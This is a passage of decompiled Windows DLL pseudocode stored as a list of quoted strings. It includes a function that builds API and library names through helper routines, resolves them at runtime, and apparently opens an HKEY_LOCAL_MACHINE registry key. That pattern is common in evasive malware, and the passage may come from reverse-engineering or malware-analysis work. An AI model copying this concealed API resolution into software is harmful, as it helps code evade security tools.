    "        v36 = (void *)*((_DWORD *)v188[0] - 1);",
    "        v37 = (const CHAR *)(2 * v190 + 37);",
    "        if ( (unsigned int)((char *)v188[0] - (char *)v36 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v37;",
    "      sub_100154EB(v36);",
    "    }",
    "    LOWORD(v188[0]) = 0;",
    "    v190 = 7;",
    "    v189 = 0;",
    "    if ( v184 > 0xF )",
    "    {",
    "      v38 = v182[0];",
    "      v39 = (const CHAR *)(v184 + 1);",
    "      if ( v184 + 1 >= 0x1000 )",
    "      {",
    "        v38 = (void *)*((_DWORD *)v182[0] - 1);",
    "        v39 = (const CHAR *)(v184 + 36);",
    "        if ( (unsigned int)((char *)v182[0] - (char *)v38 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v39;",
    "      sub_100154EB(v38);",
    "    }",
    "    LOBYTE(v182[0]) = 0;",
    "    v184 = 15;",
    "    v183 = 0;",
    "  }",
    "  if ( v196 > 0xF )",
    "  {",
    "    v40 = v194[0];",
    "    v41 = (const CHAR *)(v196 + 1);",
    "    if ( v196 + 1 >= 0x1000 )",
    "    {",
    "      v40 = (void *)*((_DWORD *)v194[0] - 1);",
    "      v41 = (const CHAR *)(v196 + 36);",
    "      if ( (unsigned int)((char *)v194[0] - (char *)v40 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v41;",
    "    sub_100154EB(v40);",
    "  }",
    "  v195 = 0;",
    "  v196 = 15;",
    "  LOBYTE(v194[0]) = 0;",
    "  if ( v199 > 7 )",
    "  {",
    "    v42 = Block;",
    "    v43 = (const CHAR *)(2 * v199 + 2);",
    "    if ( (unsigned int)v43 >= 0x1000 )",
    "    {",
    "      v42 = (_BYTE *)*((_DWORD *)Block - 1);",
    "      v43 = (const CHAR *)(2 * v199 + 37);",
    "      if ( (unsigned int)((_BYTE *)Block - v42 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v43;",
    "    sub_100154EB(v42);",
    "  }",
    "  v198 = 0;",
    "  v199 = 7;",
    "  LOWORD(Block) = 0;",
    "  if ( v217 > 0xF )",
    "  {",
    "    v44 = (CHAR *)lpLibFileName[0];",
    "    v45 = (const CHAR *)(v217 + 1);",
    "    if ( v217 + 1 >= 0x1000 )",
    "    {",
    "      v44 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "      v45 = (const CHAR *)(v217 + 36);",
    "      if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v44 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v45;",
    "    sub_100154EB(v44);",
    "  }",
    "  v216 = 0;",
    "  v217 = 15;",
    "  LOBYTE(lpLibFileName[0]) = 0;",
    "  if ( v214 > 0xF )",
    "  {",
    "    v46 = (CHAR *)lpProcName[0];",
    "    v47 = (const CHAR *)(v214 + 1);",
    "    if ( v214 + 1 >= 0x1000 )",
    "    {",
    "      v46 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "      v47 = (const CHAR *)(v214 + 36);",
    "      if ( (unsigned int)(lpProcName[0] - (LPCSTR)v46 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v47;",
    "    sub_100154EB(v46);",
    "  }",
    "  v213 = 0;",
    "  v214 = 15;",
    "  LOBYTE(lpProcName[0]) = 0;",
    "  if ( v211 > 7 )",
    "  {",
    "    v48 = (WCHAR *)lpModuleName[0];",
    "    v49 = (const CHAR *)(2 * v211 + 2);",
    "    if ( (unsigned int)v49 >= 0x1000 )",
    "    {",
    "      v48 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "      v49 = (const CHAR *)(2 * v211 + 37);",
    "      if ( (unsigned int)((char *)lpModuleName[0] - (char *)v48 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v49;",
    "    sub_100154EB(v48);",
    "  }",
    "  v210 = 0;",
    "  v211 = 7;",
    "  LOWORD(lpModuleName[0]) = 0;",
    "  if ( v205 > 0xF )",
    "  {",
    "    v50 = v203[0];",
    "    v51 = (const CHAR *)(v205 + 1);",
    "    if ( v205 + 1 >= 0x1000 )",
    "    {",
    "      v50 = (void *)*((_DWORD *)v203[0] - 1);",
    "      v51 = (const CHAR *)(v205 + 36);",
    "      if ( (unsigned int)((char *)v203[0] - (char *)v50 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v51;",
    "    sub_100154EB(v50);",
    "  }",
    "  v204 = 0;",
    "  v205 = 15;",
    "  LOBYTE(v203[0]) = 0;",
    "  if ( v208 > 7 )",
    "  {",
    "    v52 = v206[0];",
    "    v53 = (const CHAR *)(2 * v208 + 2);",
    "    if ( (unsigned int)v53 >= 0x1000 )",
    "    {",
    "      v52 = (void *)*((_DWORD *)v206[0] - 1);",
    "      v53 = (const CHAR *)(2 * v208 + 37);",
    "      if ( (unsigned int)((char *)v206[0] - (char *)v52 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v53;",
    "    sub_100154EB(v52);",
    "  }",
    "  v207 = 0;",
    "  v208 = 7;",
    "  LOWORD(v206[0]) = 0;",
    "  if ( v202 > 0xF )",
    "  {",
    "    v54 = v200[0];",
    "    v55 = (const CHAR *)(v202 + 1);",
    "    if ( v202 + 1 >= 0x1000 )",
    "    {",
    "      v54 = (void *)*((_DWORD *)v200[0] - 1);",
    "      v55 = (const CHAR *)(v202 + 36);",
    "      if ( (unsigned int)((char *)v200[0] - (char *)v54 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v55;",
    "    sub_100154EB(v54);",
    "  }",
    "  v201 = 0;",
    "  v202 = 15;",
    "  LOBYTE(v200[0]) = 0;",
    "  if ( v187 > 7 )",
    "  {",
    "    v20 = v185[0];",
    "    v21 = (const CHAR *)(2 * v187 + 2);",
    "    if ( (unsigned int)v21 < 0x1000 )",
    "      goto LABEL_111;",
    "    v20 = (void *)*((_DWORD *)v185[0] - 1);",
    "    v21 = (const CHAR *)(2 * v187 + 37);",
    "    if ( (unsigned int)((char *)v185[0] - (char *)v20 - 4) <= 0x1F )",
    "      goto LABEL_111;",
    "    goto LABEL_190;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_100067E0(_DWORD *a1)",
    "{",
    "  _DWORD *v1; // edi",
    "  void **v2; // eax",
    "  const WCHAR *v3; // ecx",
    "  const CHAR *v4; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  const CHAR *v6; // eax",
    "  _BYTE *v7; // edx",
    "  const CHAR *v8; // ecx",
    "  CHAR *v9; // edx",
    "  const CHAR *v10; // ecx",
    "  CHAR *v11; // edx",
    "  const CHAR *v12; // ecx",
    "  WCHAR *v13; // edx",
    "  const CHAR *v14; // ecx",
    "  void *v15; // edx",
    "  const CHAR *v16; // ecx",
    "  void *v17; // edx",
    "  const CHAR *v18; // ecx",
    "  void *v19; // edx",
    "  const CHAR *v20; // ecx",
    "  void **v21; // eax",
    "  int (__stdcall *v22)(int, WCHAR *, _DWORD, int, LPCWCH *); // eax",
    "  int v23; // eax",
    "  void *v24; // edx",
    "  const CHAR *v25; // ecx",
    "  _BYTE *v26; // edx",
    "  const CHAR *v27; // ecx",
    "  CHAR *v28; // edx",
    "  const CHAR *v29; // ecx",
    "  CHAR *v30; // edx",
    "  const CHAR *v31; // ecx",
    "  WCHAR *v32; // edx",
    "  const CHAR *v33; // ecx",
    "  void *v34; // edx",
    "  const CHAR *v35; // ecx",
    "  void *v36; // edx",
    "  const CHAR *v37; // ecx",
    "  int v39; // edi",
    "  void **v40; // eax",
    "  int (__stdcall *v41)(int, int, CHAR *, int *, _DWORD, _DWORD, _DWORD, _DWORD); // eax",
    "  const WCHAR *v42; // eax",
    "  void **v43; // eax",
    "  int v44; // eax",
    "  void **v45; // eax",
    "  int (__stdcall *v46)(LPCWCH, void **, _DWORD, int *, int *, LPCSTR); // ecx",
    "  void **v47; // eax",
    "  void **v48; // ecx",
    "  void **v49; // eax",
    "  void **v50; // edx",
    "  char *v51; // edi",
    "  int v52; // esi",
    "  void **v53; // eax",
    "  char *v54; // esi",
    "  const CHAR *v55; // ecx",
    "  char *v56; // eax",
    "  void *v57; // edx",
    "  const CHAR *v58; // ecx",
    "  void *v59; // edx",
    "  const CHAR *v60; // ecx",
    "  void *v61; // edx",
    "  const CHAR *v62; // ecx",
    "  void *v63; // edx",
    "  const CHAR *v64; // ecx",
    "  void *v65; // edx",
    "  const CHAR *v66; // ecx",
    "  WCHAR *v67; // edx",
    "  const CHAR *v68; // ecx",
    "  void *v69; // edx",
    "  const CHAR *v70; // ecx",
    "  unsigned int v71; // ecx",
    "  __int128 v72; // xmm0",
    "  void *v73; // edx",
    "  const CHAR *v74; // ecx",
    "  void *v75; // edx",
    "  const CHAR *v76; // ecx",
    "  WCHAR *v77; // edx",
    "  const CHAR *v78; // ecx",
    "  void *v79; // edx",
    "  const CHAR *v80; // ecx",
    "  void *v81; // edx",
    "  const CHAR *v82; // ecx",
    "  void *v83; // edx",
    "  const CHAR *v84; // ecx",
    "  _BYTE *v85; // edx",
    "  const CHAR *v86; // ecx",
    "  CHAR *v87; // edx",
    "  const CHAR *v88; // ecx",
    "  CHAR *v89; // edx",
    "  const CHAR *v90; // ecx",
    "  WCHAR *v91; // edx",
    "  const CHAR *v92; // ecx",
    "  void *v93; // edx",
    "  const CHAR *v94; // ecx",
    "  unsigned int v95; // ecx",
    "  unsigned int v96; // eax",
    "  __int128 v97; // xmm0",
    "  void *v98; // edx",
    "  const CHAR *v99; // ecx",
    "  void *v100; // edx",
    "  const CHAR *v101; // ecx",
    "  void *v102; // edx",
    "  const CHAR *v103; // ecx",
    "  _BYTE *v104; // edx",
    "  const CHAR *v105; // ecx",
    "  CHAR *v106; // edx",
    "  const CHAR *v107; // ecx",
    "  CHAR *v108; // edx",
    "  const CHAR *v109; // ecx",
    "  WCHAR *v110; // edx",
    "  const CHAR *v111; // ecx",
    "  void *v112; // edx",
    "  const CHAR *v113; // ecx",
    "  void *v114; // edx",
    "  const CHAR *v115; // ecx",
    "  _BYTE *v116; // edx",
    "  const CHAR *v117; // ecx",
    "  CHAR *v118; // edx",
    "  const CHAR *v119; // ecx",
    "  CHAR *v120; // edx",
    "  const CHAR *v121; // ecx",
    "  WCHAR *v122; // edx",
    "  const CHAR *v123; // ecx",
    "  void *v124; // edx",
    "  const CHAR *v125; // ecx",
    "  void *v126; // [esp-48h] [ebp-1A38h]",
    "  void *v127; // [esp-48h] [ebp-1A38h]",
    "  int v128; // [esp-44h] [ebp-1A34h]",
    "  int v129; // [esp-44h] [ebp-1A34h]",
    "  int v130; // [esp-40h] [ebp-1A30h]",
    "  int v131; // [esp-40h] [ebp-1A30h]",
    "  int v132; // [esp-3Ch] [ebp-1A2Ch]",
    "  int v133; // [esp-3Ch] [ebp-1A2Ch]",
    "  int v134; // [esp-38h] [ebp-1A28h]",
    "  int v135; // [esp-38h] [ebp-1A28h]",
    "  int v136; // [esp-34h] [ebp-1A24h]",
    "  int v137; // [esp-34h] [ebp-1A24h]",
    "  void *v138; // [esp-30h] [ebp-1A20h] BYREF",
    "  int v139; // [esp-2Ch] [ebp-1A1Ch]",
    "  int v140; // [esp-28h] [ebp-1A18h]",
    "  int v141; // [esp-24h] [ebp-1A14h]",
    "  int v142; // [esp-20h] [ebp-1A10h]",
    "  int v143; // [esp-1Ch] [ebp-1A0Ch]",
    "  void *v144; // [esp-18h] [ebp-1A08h] BYREF",
    "  int v145; // [esp-14h] [ebp-1A04h]",
    "  int v146; // [esp-10h] [ebp-1A00h]",
    "  int *v147; // [esp-Ch] [ebp-19FCh]",
    "  int *v148; // [esp-8h] [ebp-19F8h]",
    "  LPCSTR v149; // [esp-4h] [ebp-19F4h]",
    "  int v150; // [esp+0h] [ebp-19F0h]",
    "  int v151; // [esp+4h] [ebp-19ECh]",
    "  void *Src[4]; // [esp+10h] [ebp-19E0h] BYREF",
    "  size_t Size; // [esp+20h] [ebp-19D0h]",
    "  unsigned int v154; // [esp+24h] [ebp-19CCh]",
    "  _OWORD *v155; // [esp+28h] [ebp-19C8h]",
    "  int v156; // [esp+2Ch] [ebp-19C4h]",
    "  int i; // [esp+30h] [ebp-19C0h]",
    "  void **v158; // [esp+34h] [ebp-19BCh]",
    "  FARPROC ProcAddress; // [esp+38h] [ebp-19B8h]",
    "  int cbMultiByte; // [esp+3Ch] [ebp-19B4h]",
    "  int v161; // [esp+40h] [ebp-19B0h]",
    "  int (__stdcall *v162)(int, WCHAR *, _DWORD, int, LPCWCH *); // [esp+44h] [ebp-19ACh]",
    "  int v163; // [esp+48h] [ebp-19A8h]",
    "  int v164; // [esp+4Ch] [ebp-19A4h]",
    "  LPCWCH lpWideCharStr; // [esp+50h] [ebp-19A0h] BYREF",
    "  int v166; // [esp+54h] [ebp-199Ch] BYREF",
    "  void *v167[4]; // [esp+58h] [ebp-1998h] BYREF",
    "  int v168; // [esp+68h] [ebp-1988h]",
    "  unsigned int v169; // [esp+6Ch] [ebp-1984h]",
    "  void *v170[4]; // [esp+70h] [ebp-1980h] BYREF",
    "  size_t v171; // [esp+80h] [ebp-1970h]",
    "  unsigned int v172; // [esp+84h] [ebp-196Ch]",
    "  void *v173[4]; // [esp+88h] [ebp-1968h] BYREF",
    "  size_t v174; // [esp+98h] [ebp-1958h]",
    "  unsigned int v175; // [esp+9Ch] [ebp-1954h]",
    "  LPCWSTR v176[5]; // [esp+A0h] [ebp-1950h] BYREF",
    "  unsigned int v177; // [esp+B4h] [ebp-193Ch]",
    "  void *v178[5]; // [esp+B8h] [ebp-1938h] BYREF",
    "  unsigned int v179; // [esp+CCh] [ebp-1924h]",
    "  int v180; // [esp+D0h] [ebp-1920h] BYREF",
    "  void *v181[4]; // [esp+D4h] [ebp-191Ch] BYREF",
    "  int v182; // [esp+E4h] [ebp-190Ch]",
    "  unsigned int v183; // [esp+E8h] [ebp-1908h]",
    "  void *v184[4]; // [esp+ECh] [ebp-1904h] BYREF",
    "  int v185; // [esp+FCh] [ebp-18F4h]",
    "  unsigned int v186; // [esp+100h] [ebp-18F0h]",
    "  void *v187[4]; // [esp+104h] [ebp-18ECh] BYREF",
    "  int v188; // [esp+114h] [ebp-18DCh]",
    "  unsigned int v189; // [esp+118h] [ebp-18D8h]",
    "  void *Block; // [esp+11Ch] [ebp-18D4h] BYREF",
    "  int v191; // [esp+12Ch] [ebp-18C4h]",
    "  unsigned int v192; // [esp+130h] [ebp-18C0h]",
    "  void *v193[4]; // [esp+134h] [ebp-18BCh] BYREF",
    "  int v194; // [esp+144h] [ebp-18ACh]",
    "  unsigned int v195; // [esp+148h] [ebp-18A8h]",
    "  void *v196[4]; // [esp+14Ch] [ebp-18A4h] BYREF",
    "  int v197; // [esp+15Ch] [ebp-1894h]",
    "  unsigned int v198; // [esp+160h] [ebp-1890h]",
    "  LPCSTR lpProcName[4]; // [esp+164h] [ebp-188Ch] BYREF",
    "  int v200; // [esp+174h] [ebp-187Ch]",
    "  unsigned int v201; // [esp+178h] [ebp-1878h]",
    "  void *v202[4]; // [esp+17Ch] [ebp-1874h] BYREF",
    "  int v203; // [esp+18Ch] [ebp-1864h]",
    "  unsigned int v204; // [esp+190h] [ebp-1860h]",
    "  LPCWSTR lpModuleName[4]; // [esp+194h] [ebp-185Ch] BYREF",
    "  int v206; // [esp+1A4h] [ebp-184Ch]",
    "  unsigned int v207; // [esp+1A8h] [ebp-1848h]",
    "  LPCSTR lpLibFileName[4]; // [esp+1ACh] [ebp-1844h] BYREF",
    "  int v209; // [esp+1BCh] [ebp-1834h]",
    "  unsigned int v210; // [esp+1C0h] [ebp-1830h]",
    "  int v211; // [esp+1C4h] [ebp-182Ch] BYREF",
    "  void *v212[4]; // [esp+1C8h] [ebp-1828h] BYREF",
    "  __int64 v213; // [esp+1D8h] [ebp-1818h]",
    "  CHAR MultiByteStr[2048]; // [esp+1E0h] [ebp-1810h] BYREF",
    "  WCHAR v215[1024]; // [esp+9E0h] [ebp-1010h] BYREF",
    "  unsigned __int16 cchWideChar[1024]; // [esp+11E0h] [ebp-810h] BYREF",
    "  int v217; // [esp+19ECh] [ebp-4h]",
    "",
    "  v1 = a1;",
    "  v163 = (int)a1;",
    "  v155 = a1;",
    "  v166 = 0;",
    "  lpWideCharStr = 0;",
    "  sub_1000A970(v150, v151);",
    "  v164 = sub_10002FE0();",
    "  sub_10009E70(v164 + 1128);",
    "  sub_1000B000(v178, v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "  v217 = 0;",
    "  sub_10009E70(v178);",
    "  sub_1000AA30((int)v202, (LPCCH)v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "  LOBYTE(v217) = 1;",
    "  v2 = v202;",
    "  v180 = 983103;",
    "  if ( v204 > 7 )",
    "    v2 = (void **)v202[0];",
    "  v163 = (int)&v144;",
    "  v156 = (int)v2;",
    "  v211 = 0;",
    "  sub_10009E70(v164);",
    "  sub_1000B000(&v144, v138, v139, v140, v141, v142, v143);",
    "  LOBYTE(v217) = 2;",
    "  sub_10009E70(v164 + 744);",
    "  LOBYTE(v217) = 1;",
    "  sub_1000B970((int)v193, v138, v139, v140, v141, v142, v143, v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "  LOBYTE(v217) = 3;",
    "  sub_10009E70(v193);",
    "  sub_1000AA30((int)lpModuleName, (LPCCH)v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "  LOBYTE(v217) = 4;",
    "  v163 = (int)&v144;",
    "  sub_10009E70(v164 + 24);",
    "  sub_1000B000(&v144, v138, v139, v140, v141, v142, v143);",
    "  LOBYTE(v217) = 5;",
    "  sub_10009E70(v164 + 768);",
    "  LOBYTE(v217) = 4;",
    "  sub_1000B970((int)lpProcName, v138, v139, v140, v141, v142, v143, v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "  LOBYTE(v217) = 6;",
    "  v163 = (int)&v144;",
    "  sub_10009E70(v164 + 216);",
    "  sub_1000B000(&v144, v138, v139, v140, v141, v142, v143);",
    "  LOBYTE(v217) = 7;",
    "  sub_10009E70(v164 + 960);",
    "  LOBYTE(v217) = 6;",
    "  sub_1000B970(",
    "    (int)lpLibFileName,",
    "    v138,",
    "    v139,",
    "    v140,",
    "    v141,",
    "    v142,",
    "    v143,",
    "    v144,",
    "    v145,",
    "    v146,",
    "    (int)v147,",
    "    (int)v148,",
    "    (int)v149);",
    "  LOBYTE(v217) = 8;",
    "  sub_10009E70(lpLibFileName);",
    "  sub_1000AA30((int)&Block, (LPCCH)v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "  LOBYTE(v217) = 9;",
    "  v3 = (const WCHAR *)lpModuleName;",
    "  v4 = (const CHAR *)lpProcName;",
    "  if ( v207 > 7 )",
    "    v3 = lpModuleName[0];",
    "  if ( v201 > 0xF )",
    "    v4 = lpProcName[0];",
    "  v149 = v4;",
    "  ModuleHandleW = GetModuleHandleW(v3);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v149);",
    "  v6 = (const CHAR *)lpLibFileName;",
    "  if ( v210 > 0xF )",
    "    v6 = lpLibFileName[0];",
    "  cbMultiByte = (int)LoadLibraryA(v6);",
    "  if ( !cbMultiByte )",
    "  {",
    "    v149 = 0;",
    "    *(_OWORD *)a1 = 0;",
    "    v148 = (int *)&unk_1003B3A1;",
    "    a1[4] = 0;",
    "    a1[5] = 0;",
    "    sub_100018C0(a1, v148, (size_t)v149);",
    "    if ( v192 > 7 )",
    "    {",
    "      v7 = Block;",
    "      v8 = (const CHAR *)(2 * v192 + 2);",
    "      if ( (unsigned int)v8 >= 0x1000 )",
    "      {",
    "        v7 = (_BYTE *)*((_DWORD *)Block - 1);",
    "        v8 = (const CHAR *)(2 * v192 + 37);",
    "        if ( (unsigned int)((_BYTE *)Block - v7 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v8;",
    "      sub_100154EB(v7);",
    "    }",
    "    v191 = 0;",
    "    v192 = 7;",
    "    LOWORD(Block) = 0;",
    "    if ( v210 > 0xF )",
    "    {",
    "      v9 = (CHAR *)lpLibFileName[0];",
    "      v10 = (const CHAR *)(v210 + 1);",
    "      if ( v210 + 1 >= 0x1000 )",
    "      {",
    "        v9 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v10 = (const CHAR *)(v210 + 36);",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v9 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v10;",
    "      sub_100154EB(v9);",
    "    }",
    "    v209 = 0;",
    "    v210 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v201 > 0xF )",
    "    {",
    "      v11 = (CHAR *)lpProcName[0];",
    "      v12 = (const CHAR *)(v201 + 1);",
    "      if ( v201 + 1 >= 0x1000 )",
    "      {",
    "        v11 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v12 = (const CHAR *)(v201 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v11 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v12;",
    "      sub_100154EB(v11);",
    "    }",
    "    v200 = 0;",
    "    v201 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v207 > 7 )",
    "    {",
    "      v13 = (WCHAR *)lpModuleName[0];",
    "      v14 = (const CHAR *)(2 * v207 + 2);",
    "      if ( (unsigned int)v14 >= 0x1000 )",
    "      {",
    "        v13 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v14 = (const CHAR *)(2 * v207 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v13 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v14;",
    "      sub_100154EB(v13);",
    "    }",
    "    v206 = 0;",
    "    v207 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v195 > 0xF )",
    "    {",
    "      v15 = v193[0];",
    "      v16 = (const CHAR *)(v195 + 1);",
    "      if ( v195 + 1 >= 0x1000 )",
    "      {",
    "        v15 = (void *)*((_DWORD *)v193[0] - 1);",
    "        v16 = (const CHAR *)(v195 + 36);",
    "        if ( (unsigned int)((char *)v193[0] - (char *)v15 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v16;",
    "      sub_100154EB(v15);",
    "    }",
    "    v194 = 0;",
    "    v195 = 15;",
    "    LOBYTE(v193[0]) = 0;",
    "    if ( v204 <= 7 )",
    "      goto LABEL_34;",
    "    v17 = v202[0];",
    "    v18 = (const CHAR *)(2 * v204 + 2);",
    "    if ( (unsigned int)v18 >= 0x1000 )",
    "    {",
    "      v17 = (void *)*((_DWORD *)v202[0] - 1);",
    "      v18 = (const CHAR *)(2 * v204 + 37);",
    "      if ( (unsigned int)((char *)v202[0] - (char *)v17 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    goto LABEL_33;",
    "  }",
    "  v163 = (int)&v144;",
    "  sub_10009E70(v164 + 264);",
    "  sub_1000B000(&v144, v138, v139, v140, v141, v142, v143);",
    "  LOBYTE(v217) = 10;",
    "  sub_10009E70(v164 + 1032);",
    "  LOBYTE(v217) = 9;",
    "  sub_1000B970((int)v196, v138, v139, v140, v141, v142, v143, v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "  LOBYTE(v217) = 11;",
    "  v21 = v196;",
    "  if ( v198 > 0xF )",
    "    v21 = (void **)v196[0];",
    "  v22 = (int (__stdcall *)(int, WCHAR *, _DWORD, int, LPCWCH *))((int (__stdcall *)(int, void **))ProcAddress)(",
    "                                                                  cbMultiByte,",
    "                                                                  v21);",
    "  v162 = v22;",
    "  if ( !v22 )",
    "  {",
    "    v149 = 0;",
    "    *(_OWORD *)a1 = 0;",
    "    v148 = (int *)&unk_1003B3A1;",
    "    a1[4] = 0;",
    "    a1[5] = 0;",
    "    sub_100018C0(a1, v148, (size_t)v149);",
    "    if ( v198 > 0xF )",
    "    {",
    "      v114 = v196[0];",
    "      v115 = (const CHAR *)(v198 + 1);",
    "      if ( v198 + 1 >= 0x1000 )",
    "      {",
    "        v114 = (void *)*((_DWORD *)v196[0] - 1);",
    "        v115 = (const CHAR *)(v198 + 36);",
    "        if ( (unsigned int)((char *)v196[0] - (char *)v114 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v115;",
    "      sub_100154EB(v114);",
    "    }",
    "    v197 = 0;",
    "    v198 = 15;",
    "    LOBYTE(v196[0]) = 0;",
    "    if ( v192 > 7 )",
    "    {",
    "      v116 = Block;",
    "      v117 = (const CHAR *)(2 * v192 + 2);",
    "      if ( (unsigned int)v117 >= 0x1000 )",
    "      {",
    "        v116 = (_BYTE *)*((_DWORD *)Block - 1);",
    "        v117 = (const CHAR *)(2 * v192 + 37);",
    "        if ( (unsigned int)((_BYTE *)Block - v116 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v117;",
    "      sub_100154EB(v116);",
    "    }",
    "    v191 = 0;",
    "    v192 = 7;",
    "    LOWORD(Block) = 0;",
    "    if ( v210 > 0xF )",
    "    {",
    "      v118 = (CHAR *)lpLibFileName[0];",
    "      v119 = (const CHAR *)(v210 + 1);",
    "      if ( v210 + 1 >= 0x1000 )",
    "      {",
    "        v118 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v119 = (const CHAR *)(v210 + 36);",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v118 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v119;",
    "      sub_100154EB(v118);",
    "    }",
    "    v209 = 0;",
    "    v210 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v201 > 0xF )",
    "    {",
    "      v120 = (CHAR *)lpProcName[0];",
    "      v121 = (const CHAR *)(v201 + 1);",
    "      if ( v201 + 1 >= 0x1000 )",
    "      {",
    "        v120 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v121 = (const CHAR *)(v201 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v120 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v121;",
    "      sub_100154EB(v120);",
    "    }",
    "    v200 = 0;",
    "    v201 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v207 > 7 )",
    "    {",
    "      v122 = (WCHAR *)lpModuleName[0];",
    "      v123 = (const CHAR *)(2 * v207 + 2);",
    "      if ( (unsigned int)v123 >= 0x1000 )",
    "      {",
    "        v122 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v123 = (const CHAR *)(2 * v207 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v122 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v123;",
    "      sub_100154EB(v122);",
    "    }",
    "    v206 = 0;",
    "    v207 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v195 > 0xF )",
    "    {",
    "      v124 = v193[0];",
    "      v125 = (const CHAR *)(v195 + 1);",
    "      if ( v195 + 1 >= 0x1000 )",
    "      {",
    "        v124 = (void *)*((_DWORD *)v193[0] - 1);",
    "        v125 = (const CHAR *)(v195 + 36);",
    "        if ( (unsigned int)((char *)v193[0] - (char *)v124 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v125;",
    "      sub_100154EB(v124);",
    "    }",
    "    v194 = 0;",
    "    v195 = 15;",
    "    LOBYTE(v193[0]) = 0;",
    "    if ( v204 <= 7 )",
    "      goto LABEL_34;",
    "    v17 = v202[0];",
    "    v18 = (const CHAR *)(2 * v204 + 2);",
    "    if ( (unsigned int)v18 >= 0x1000 )",
    "    {",
    "      v17 = (void *)*((_DWORD *)v202[0] - 1);",
    "      v18 = (const CHAR *)(2 * v204 + 37);",
    "      if ( (unsigned int)((char *)v202[0] - (char *)v17 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "LABEL_33:",
    "    v149 = v18;",
    "    sub_100154EB(v17);",
    "    goto LABEL_34;",
    "  }",
    "  v23 = v22(-2147483646, (WCHAR *)v156, 0, 131097, (LPCWCH *)&v166);",
    "  v149 = 0;",
    "  v148 = (int *)&unk_1003B3A1;",
    "  if ( v23 )",
    "  {",
    "    *(_OWORD *)a1 = 0;",
    "    a1[4] = 0;",
    "    a1[5] = 0;",
    "    sub_100018C0(a1, v148, (size_t)v149);",
    "    if ( v198 > 0xF )",
    "    {",
    "      v24 = v196[0];",
    "      v25 = (const CHAR *)(v198 + 1);",
    "      if ( v198 + 1 >= 0x1000 )",
    "      {",
    "        v24 = (void *)*((_DWORD *)v196[0] - 1);",
    "        v25 = (const CHAR *)(v198 + 36);",
    "        if ( (unsigned int)((char *)v196[0] - (char *)v24 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v25;",
    "      sub_100154EB(v24);",
    "    }",
    "    v197 = 0;",
    "    v198 = 15;",
    "    LOBYTE(v196[0]) = 0;",
    "    if ( v192 > 7 )",
    "    {",
    "      v26 = Block;",
    "      v27 = (const CHAR *)(2 * v192 + 2);",
